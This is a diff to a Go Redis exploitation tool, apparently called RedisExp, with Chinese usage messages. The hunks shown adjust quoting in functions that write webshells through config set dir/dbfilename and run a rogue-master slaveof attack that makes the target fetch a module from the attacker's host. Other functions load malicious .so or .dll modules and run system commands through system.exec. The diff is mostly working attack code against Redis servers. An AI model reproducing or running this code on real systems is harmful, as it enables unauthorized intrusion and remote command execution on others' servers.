@@ -207,14 +207,16 @@ func main() {
 				fmt.Println("参数错误: RedisExp.exe -m dir -r 目标IP -p 目标端口 -w 密码 -rf 目标文件名[绝对路径]")
 				return
 			}
+
 			res := configSet("dir", rfile)
+			fmt.Println(">>> config set dir " + rfile)
 
 			if res == "ERR Changing directory: Not a directory" {
 				fmt.Println("文件存在", res)
 			} else if res == "ERR Changing directory: No such file or directory" {
 				fmt.Println("文件不存在", res)
 			} else {
-				fmt.Println("执行成功 config set dir", rfile)
+				fmt.Println(res)
 			}
 		case "cli":
 			if command != "" {
@@ -227,11 +229,11 @@ func main() {
 				fmt.Println("参数错误: RedisExp.exe -m load -r 目标IP -p 目标端口 -w 密码 -rf 目标 dll | so 文件名")
 				return
 			}
-			cliInfo("module load " + rfile)
+			cliInfo("module load \"" + rfile + "\"")
 
 			if command != "" {
 				runCmd(command)
-				cliInfo("module unload " + execName)
+				cliInfo("module unload \"" + execName + "\"")
 			} else {
 				loopCmd("load")
 			}
@@ -391,9 +393,9 @@ func parseArgs(cmd string) ([]interface{}, error) {
 
 	var args []interface{}
 	for _, match := range matches {
+
 		// 如果匹配项是以引号开始和结束的，就去掉引号
-		if strings.HasPrefix(match, "\"") && strings.HasSuffix(match, "\"") ||
-			strings.HasPrefix(match, "'") && strings.HasSuffix(match, "'") {
+		if strings.HasPrefix(match, "\"") && strings.HasSuffix(match, "\"") || strings.HasPrefix(match, "'") && strings.HasSuffix(match, "'") {
 			match = match[1 : len(match)-1]
 		}
 		args = append(args, match)
@@ -409,8 +411,8 @@ func echoShell(dir, dbfilename, webshell string) {
 		cliInfo("config set stop-writes-on-bgsave-error no")
 	}
 
-	cliInfo("config set dir " + dir)
-	cliInfo("config set dbfilename " + dbfilename)
+	cliInfo("config set dir \"" + dir + "\"")
+	cliInfo("config set dbfilename \"" + dbfilename + "\"")
 
 	if b64 {
 		decodeBytes, err := base64.StdEncoding.DecodeString(webshell)
@@ -459,8 +461,8 @@ func echoShell(dir, dbfilename, webshell string) {
 	defer func() {
 		// 恢复原始配置
 
-		cliInfo("config set dir " + redisDir)
-		cliInfo("config set dbfilename " + redisDBFilename)
+		cliInfo("config set dir \"" + redisDir + "\"")
+		cliInfo("config set dbfilename \"" + redisDBFilename + "\"")
 
 		cliInfo("config set rdbcompression " + compression)
 		cliInfo("config set slave-read-only " + readOnly)
@@ -486,8 +488,8 @@ func redisSlave(lhost, lport, dir, dbfilename string) {
 
 	cliInfo(fmt.Sprintf("slaveof %v %v", lhost, lport))
 
-	cliInfo("config set dir " + dir)
-	cliInfo("config set dbfilename " + dbfilename)
+	cliInfo("config set dir \"" + dir + "\"")
+	cliInfo("config set dbfilename \"" + dbfilename + "\"")
 
 	err := listen(lport, payload)
 	if err != nil {
@@ -497,12 +499,12 @@ func redisSlave(lhost, lport, dir, dbfilename string) {
 
 	load := fmt.Sprintf("%v/%v", dir, dbfilename)
 
-	cliInfo("module load " + load)
+	cliInfo("module load \"" + load + "\"")
 
 	defer func() {
 		// 恢复原始配置
-		cliInfo("config set dir " + redisDir)
-		cliInfo("config set dbfilename " + redisDBFilename)
+		cliInfo("config set dir \"" + redisDir + "\"")
+		cliInfo("config set dbfilename \"" + redisDBFilename + "\"")
 		cliInfo("config set stop-writes-on-bgsave-error " + bgErr)
 	}()
 }
@@ -578,11 +580,7 @@ func sendCmd(payload []byte, wg *sync.WaitGroup, c *net.TCPConn) {
 // RunCmd system.exec 执行命令
 func runCmd(cmd string) {
 
-	// val, err := rdb.Do(ctx, "system.exec", cmd).Result()
-	// if err != nil {
-	// 	fmt.Println(err)
-	// 	return
-	// }
+	cmd = "\"" + cmd + "\""
 
 	fmt.Printf(">>> %s %s\n", execTemplate, cmd)
 
@@ -608,9 +606,9 @@ func closeSlave(dll string) {
 	}
 
 	// 执行命令才卸载 module
-	if strings.Contains(dll, ".so") {
-		cliInfo("rm " + dll)
-	}
+	// if strings.Contains(dll, ".so") {
+	// 	runCmd("'rm -rf " + rpath + "/" + dll + "'")
+	// }
 
 	// 执行 MODULE UNLOAD <module_name> 命令
 
@@ -652,7 +650,7 @@ func redisUpload(lhost, lport, rpath, rfile, lfile string) {
 	}
 
 	cliInfo(fmt.Sprintf("slaveof %v %v", lhost, lport))
-	cliInfo("config set dir " + rpath)
+	cliInfo("config set dir \"" + rpath + "\"")
 	cliInfo("config set dbfilename " + rfile)
 
 	listen(lport, payload)
@@ -662,8 +660,8 @@ func redisUpload(lhost, lport, rpath, rfile, lfile string) {
 	defer func() {
 		// 恢复原始配置
 		closeSlave("upload")
-		cliInfo("config set dir " + redisDir)
-		cliInfo("config set dbfilename " + redisDBFilename)
+		cliInfo("config set dir \"" + redisDir + "\"")
+		cliInfo("config set dbfilename \"" + redisDBFilename + "\"")
 		cliInfo("config set stop-writes-on-bgsave-error " + bgErr)
 	}()
 }
